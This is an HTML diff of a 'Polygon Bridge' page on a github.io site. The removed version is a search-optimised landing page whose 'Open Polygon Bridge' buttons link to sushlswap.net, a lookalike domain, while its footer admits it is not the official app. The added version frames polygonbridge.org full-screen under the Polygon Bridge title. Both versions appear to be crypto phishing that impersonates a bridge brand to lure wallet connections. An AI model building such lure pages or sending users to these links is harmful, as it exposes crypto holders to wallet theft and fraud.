@@ -1,261 +1,40 @@
 <!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>Polygon Bridge — Cross-Chain Bridge</title>
-<meta content="Polygon Bridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://polygon-bridge-app.github.io/" rel="canonical"/>
-<link href="https://polygon-bridge-app.github.io/" hreflang="en" rel="alternate"/><link href="https://polygon-bridge-app.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#0B080F" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="Polygon Bridge — Cross-Chain Bridge" property="og:title"/><meta content="Polygon Bridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." property="og:description"/>
-<meta content="https://polygon-bridge-app.github.io/" property="og:url"/><meta content="https://polygon-bridge-app.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="Polygon Bridge — Cross-Chain Bridge" name="twitter:title"/><meta content="Polygon Bridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." name="twitter:description"/><meta content="https://polygon-bridge-app.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://polygon-bridge-app.github.io/#website",
-      "url": "https://polygon-bridge-app.github.io/",
-      "name": "Polygon Bridge"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://polygon-bridge-app.github.io/#webpage",
-      "url": "https://polygon-bridge-app.github.io/",
-      "name": "Polygon Bridge — Cross-Chain Bridge",
-      "description": "Polygon Bridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://polygon-bridge-app.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://polygon-bridge-app.github.io/#org",
-      "name": "Polygon Bridge",
-      "url": "https://polygon-bridge-app.github.io/",
-      "logo": "https://polygon-bridge-app.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://polygon-bridge-app.github.io/#app",
-      "name": "Polygon Bridge",
-      "url": "https://polygon-bridge-app.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "Polygon Bridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet.",
-      "featureList": [
-        "Cross-Chain Bridge",
-        "Bridge to Polygon, from your wallet"
-      ],
-      "isPartOf": {
-        "@id": "https://polygon-bridge-app.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://polygon-bridge-app.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "What is the official Polygon bridge?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Polygon Portal is the official interface for bridging and managing assets across Polygon networks. The Polygon Portal docs describe wallet connection, bridging, claims, transaction status, and custom token handling. Always type or bookmark the official URL instead of following ads or direct-message links."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How does the Polygon PoS bridge move tokens?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "For the PoS bridge, deposits lock supported tokens on Ethereum and mint pegged tokens on Polygon; withdrawals burn pegged tokens on Polygon and unlock the originals on Ethereum. Polygon's official PoS bridge overview describes that lock/mint and burn/unlock model."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What fees apply when using polygon bridge?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Fees are components, not a fixed universal number: source-chain gas, destination claim gas when required, token approval gas, and any route-specific fee shown by the interface. Polygon's Portal guide shows that users review the route and transaction status in the bridge flow."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Is polygon bridge safe?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "No bridge removes risk. Native bridge flows reduce some third-party custody concerns, but users still face smart-contract risk, network risk, phishing, wrong-network deposits, and token-contract mistakes. Ethereum.org's bridge risk section gives a plain overview of common bridge risks."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Can I bridge directly between Polygon PoS and Polygon zkEVM?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Do not assume direct native routing. Polygon's Portal docs state that the native bridge does not support direct bridging between Polygon PoS and zkEVM chains. Also check Polygon's current zkEVM status before using any zkEVM-related route."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What should I check before signing a bridge transaction?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Confirm the official URL, source network, destination network, token contract, recipient, approvals, gas asset, estimated arrival, and claim requirement. The Polygon Portal instructions show the normal flow for choosing a route and tracking a bridge transaction after signing."
-          }
-        }
-      ]
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Polygon Bridge</title>
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
     }
-  ]
-}</script></head>
+
+    iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: 0;
+      margin: 0;
+      padding: 0;
+      display: block;
+    }
+  </style>
+</head>
 <body>
-<header class="site-header">
-<a aria-label="Polygon Bridge" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#E4D3FC"></stop><stop offset=".5" stop-color="#C19DF4"></stop><stop offset="1" stop-color="#9759ED"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>Polygon Bridge</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-works">How it works</a></li><li><a href="#fees-security">Fees security</a></li><li><a href="#route-notes">Route notes</a></li><li><a href="#routes">Routes</a></li><li><a href="#assets">Assets</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Polygon Bridge</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
-</header>
-<main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Bridge to Polygon, from your wallet</h2>
-<p class="lead"><strong>Polygon Bridge</strong> — Move supported tokens between Ethereum and Polygon networks while reviewing route, gas, claim, and security assumptions.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Polygon Bridge ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open Polygon Bridge to bridge on Polygon.</p><div class="trust-row"><span class="trust-chip">Polygon</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Bridge</span><span class="badge">Polygon</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="ETH" class="" decoding="async" height="28" loading="lazy" src="eth.png" width="28"/></span><span class="token-ticker">ETH</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><img alt="POL" class="" decoding="async" height="28" loading="lazy" src="pol.png" width="28"/></span><span class="token-ticker">POL</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Polygon Bridge ↗</a>
-<p class="swap-note">Preview — open Polygon Bridge to bridge.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is Polygon Bridge?</h2><div class="capsule"><p>Polygon bridge usually refers to using Polygon Portal to move supported assets between Ethereum and Polygon networks. The official <a href="https://docs.polygon.technology/pos/how-to/bridging/ethereum-polygon/portal-ui" rel="noopener noreferrer">Polygon Portal docs</a> describe a trustless two-way bridge for Polygon PoS and Ethereum, where deposits lock tokens on Ethereum and mint pegged tokens on Polygon, while withdrawals burn on Polygon and unlock on Ethereum. Users still need to review network gas, route support, token contracts, and claim steps.</p></div></div></section>
-<section class="section section-alt" id="how-it-works">
-<div class="container"><h2>How Polygon Bridge works</h2><p class="section-intro">Polygon Portal presents the route, token, amount, wallet prompt, and transaction status. The exact settlement path depends on the source network, destination network, and token.</p>
-<ol class="steps"><li><strong>Pick the official entry point</strong><span>Start from Polygon Portal or Polygon docs, then confirm the URL before connecting a wallet.</span></li><li><strong>Choose route and token</strong><span>Select source chain, destination chain, token, amount, and receiving wallet if the interface supports a separate recipient.</span></li><li><strong>Review cost components</strong><span>Check network gas, any route fee, token approval, estimated arrival, and whether a later claim transaction is required.</span></li><li><strong>Track and claim</strong><span>After signing, monitor the transaction page and complete any required claim on the destination side.</span></li></ol>
-</div>
-</section>
-<section class="section" id="fees-security">
-<div class="container"><h2>Fees and security</h2><p class="section-intro">There is no single Polygon bridge fee. Cost and risk change with gas markets, token approvals, the selected bridge path, and the trust model.</p>
-<div class="cards three"><article class="card"><h3>Cost components</h3><p>Expect source-chain gas, destination claim gas when required, token approval gas, and any route-specific fee shown before signing. Polygon's <a href="https://docs.polygon.technology/tools/wallets/portal" rel="noopener noreferrer">Portal guide</a> explains where users choose routes and check transaction status.</p></article><article class="card"><h3>Trust model</h3><p>Native bridge flows use smart contracts and chain verification rather than an exchange account, but that does not remove smart-contract or user-error risk. Ethereum.org's <a href="https://ethereum.org/bridges/" rel="noopener noreferrer">bridge overview</a> explains common trusted and trustless bridge tradeoffs.</p></article><article class="card"><h3>Token verification</h3><p>Use the exact token shown in the portal, verify contract addresses for custom tokens, and avoid links sent through ads or direct messages. Polygon docs note that users can <a href="https://docs.polygon.technology/tools/wallets/portal" rel="noopener noreferrer">add custom tokens</a> when a token is not listed.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="route-notes">
-<div class="container"><h2>Route notes before bridging</h2><p class="section-intro">Polygon Portal can include native and third-party routes in the same interface, so read the confirmation screen instead of assuming every path has the same bridge design.</p>
-<div class="cards three"><article class="card"><h3>PoS and Ethereum</h3><p>For Polygon PoS to Ethereum, expect a burn-and-unlock withdrawal flow and possible claim steps. The official <a href="https://docs.polygon.technology/pos/how-to/bridging/ethereum-polygon/portal-ui" rel="noopener noreferrer">PoS bridge overview</a> is the best starting point.</p></article><article class="card"><h3>zkEVM status</h3><p>Polygon's own materials mark zkEVM as sunsetting, so check the current official status before using routes that involve it. Start with the <a href="https://polygon.technology/polygon-zkevm" rel="noopener noreferrer">Polygon zkEVM page</a> and avoid stale third-party instructions.</p></article><article class="card"><h3>Third-party options</h3><p>If the portal offers a third-party bridge, its liquidity, fee logic, and security assumptions may differ from the native bridge. Treat the provider's official docs and Ethereum.org's <a href="https://ethereum.org/bridges/" rel="noopener noreferrer">bridge risk notes</a> as required reading.</p></article></div>
-</div>
-</section>
-<section class="section" id="routes">
-<div class="container">
-<h2>Common Polygon Bridge Routes</h2>
-<p class="section-intro">Start by matching the source chain, destination chain, and claim requirements before signing.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">ETH-P</span>
-<div><h3>Ethereum to Polygon PoS</h3><p class="coin-sub">Deposit into Polygon PoS <span class="tag">Native</span></p></div>
-</div>
-<p class="coin-intent">Use this when funds are on Ethereum and the destination app or wallet expects Polygon PoS assets. Deposits lock supported tokens on Ethereum and mint pegged assets on Polygon PoS.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="ETH-P" href="https://docs.polygon.technology/pos/how-to/bridging/ethereum-polygon/portal-ui" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">P-ETH</span>
-<div><h3>Polygon PoS to Ethereum</h3><p class="coin-sub">Withdraw back to Ethereum <span class="tag">Claim</span></p></div>
-</div>
-<p class="coin-intent">Use this when you need the Ethereum version of a token again. Review burn, checkpoint, exit, gas, and claim steps before starting.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="P-ETH" href="https://docs.polygon.technology/pos/how-to/bridging/ethereum-polygon/portal-ui" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">PORT</span>
-<div><h3>Polygon Portal</h3><p class="coin-sub">Official bridge interface <span class="tag">Official</span></p></div>
-</div>
-<p class="coin-intent">Use the portal to select chains, tokens, amount, and status tracking from a single Polygon interface. Confirm the route details because native and third-party options can appear together.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="PORT" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">CSTM</span>
-<div><h3>Custom Token Route</h3><p class="coin-sub">When a token is not listed <span class="tag">Verify</span></p></div>
-</div>
-<p class="coin-intent">Use only after verifying the token contract on the correct network. A listed balance is not a substitute for checking the contract and destination support.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="CSTM" href="https://docs.polygon.technology/tools/wallets/portal" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="assets">
-<div class="container">
-<h2>Assets Users Often Check</h2>
-<p class="section-intro">Availability can vary by route, so treat these as assets to verify in the portal before bridging.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="ETH" class="coin-icon" decoding="async" height="40" loading="lazy" src="eth.png" width="40"/>
-<div><h3>Ether</h3><p class="coin-sub">Ethereum network asset <span class="tag">Gas</span></p></div>
-</div>
-<p class="coin-intent">Bridge only after confirming whether the destination receives wrapped ETH or a chain-specific representation. Keep enough ETH for Ethereum gas.</p>
-<a class="cta cta-mini swap-now" data-icon="eth.png" data-ticker="ETH" href="https://ethereum.org/en/eth/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="POL" class="coin-icon" decoding="async" height="40" loading="lazy" src="pol.png" width="40"/>
-<div><h3>POL</h3><p class="coin-sub">Polygon ecosystem token <span class="tag">Native</span></p></div>
-</div>
-<p class="coin-intent">Check whether your route, wallet, and app expect POL on Polygon PoS or a different network representation. Network selection matters.</p>
-<a class="cta cta-mini swap-now" data-icon="pol.png" data-ticker="POL" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="USDC" class="coin-icon" decoding="async" height="40" loading="lazy" src="usdc.png" width="40"/>
-<div><h3>USDC</h3><p class="coin-sub">Circle dollar token <span class="tag">Stable</span></p></div>
-</div>
-<p class="coin-intent">Verify the exact USDC version and contract before moving funds. Stablecoin names can look similar across networks.</p>
-<a class="cta cta-mini swap-now" data-icon="usdc.png" data-ticker="USDC" href="https://www.circle.com/usdc" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="USDT" class="coin-icon" decoding="async" height="40" loading="lazy" src="usdt.png" width="40"/>
-<div><h3>USDT</h3><p class="coin-sub">Tether dollar token <span class="tag">Stable</span></p></div>
-</div>
-<p class="coin-intent">Confirm the token contract and destination support before bridging. Do not assume an exchange deposit address supports every network.</p>
-<a class="cta cta-mini swap-now" data-icon="usdt.png" data-ticker="USDT" href="https://tether.to/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="WBTC" class="coin-icon" decoding="async" height="40" loading="lazy" src="wbtc.png" width="40"/>
-<div><h3>Wrapped Bitcoin</h3><p class="coin-sub">Tokenized BTC exposure <span class="tag">Wrapped</span></p></div>
-</div>
-<p class="coin-intent">Use extra care with wrapped assets because issuer, chain, and contract details define what you actually receive.</p>
-<a class="cta cta-mini swap-now" data-icon="wbtc.png" data-ticker="WBTC" href="https://wbtc.network/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section" id="compare"><div class="container"><h2>Native bridge vs third-party route</h2><p class="section-intro">Polygon Portal may show native and third-party paths. Ethereum.org's <a href="https://ethereum.org/bridges/" rel="noopener noreferrer">bridge guide</a> explains why trust model and custody assumptions matter.</p>
-<div class="table-wrap"><table class="compare-table"><thead><tr><th>Route type</th><th>What to check</th><th>Best fit</th></tr></thead><tbody><tr><td>Native Polygon bridge</td><td>Claim steps, gas on both sides, supported token mapping</td><td>Users who prefer Polygon's official bridge contracts</td></tr><tr><td>Third-party bridge</td><td>Provider docs, liquidity, fee logic, custody or verifier assumptions</td><td>Users comparing alternative routes inside or outside the portal</td></tr><tr><td>Exchange transfer</td><td>Supported network, deposit address, withdrawal status, account custody</td><td>Users who already plan to use a centralized account</td></tr></tbody></table></div></div></section>
-<section class="section" id="faq"><div class="container"><h2>Polygon Bridge FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>What is the official Polygon bridge?</h3></summary><div>Polygon Portal is the official interface for bridging and managing assets across Polygon networks. The <a href="https://docs.polygon.technology/tools/wallets/portal" rel="noopener noreferrer">Polygon Portal docs</a> describe wallet connection, bridging, claims, transaction status, and custom token handling. Always type or bookmark the official URL instead of following ads or direct-message links.</div></details>
-<details open=""><summary><h3>How does the Polygon PoS bridge move tokens?</h3></summary><div>For the PoS bridge, deposits lock supported tokens on Ethereum and mint pegged tokens on Polygon; withdrawals burn pegged tokens on Polygon and unlock the originals on Ethereum. Polygon's <a href="https://docs.polygon.technology/pos/how-to/bridging/ethereum-polygon/portal-ui" rel="noopener noreferrer">official PoS bridge overview</a> describes that lock/mint and burn/unlock model.</div></details>
-<details><summary><h3>What fees apply when using Polygon Bridge?</h3></summary><div>Fees are components, not a fixed universal number: source-chain gas, destination claim gas when required, token approval gas, and any route-specific fee shown by the interface. Polygon's <a href="https://docs.polygon.technology/tools/wallets/portal" rel="noopener noreferrer">Portal guide</a> shows that users review the route and transaction status in the bridge flow.</div></details>
-<details><summary><h3>Is Polygon Bridge safe?</h3></summary><div>No bridge removes risk. Native bridge flows reduce some third-party custody concerns, but users still face smart-contract risk, network risk, phishing, wrong-network deposits, and token-contract mistakes. Ethereum.org's <a href="https://ethereum.org/bridges/" rel="noopener noreferrer">bridge risk section</a> gives a plain overview of common bridge risks.</div></details>
-<details><summary><h3>Can I bridge directly between Polygon PoS and Polygon zkEVM?</h3></summary><div>Do not assume direct native routing. Polygon's <a href="https://docs.polygon.technology/tools/wallets/portal" rel="noopener noreferrer">Portal docs</a> state that the native bridge does not support direct bridging between Polygon PoS and zkEVM chains. Also check Polygon's current zkEVM status before using any zkEVM-related route.</div></details>
-<details><summary><h3>What should I check before signing a bridge transaction?</h3></summary><div>Confirm the official URL, source network, destination network, token contract, recipient, approvals, gas asset, estimated arrival, and claim requirement. The <a href="https://docs.polygon.technology/tools/wallets/portal" rel="noopener noreferrer">Polygon Portal instructions</a> show the normal flow for choosing a route and tracking a bridge transaction after signing.</div></details>
-</div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-works">How it works</a><a href="#fees-security">Fees security</a><a href="#route-notes">Route notes</a><a href="#routes">Routes</a><a href="#assets">Assets</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official Polygon Bridge app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script defer="" src="static/app.js"></script>
-</body></html>
+
+  <iframe
+    src="https://polygonbridge.org/"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
+
+</body>
+</html>
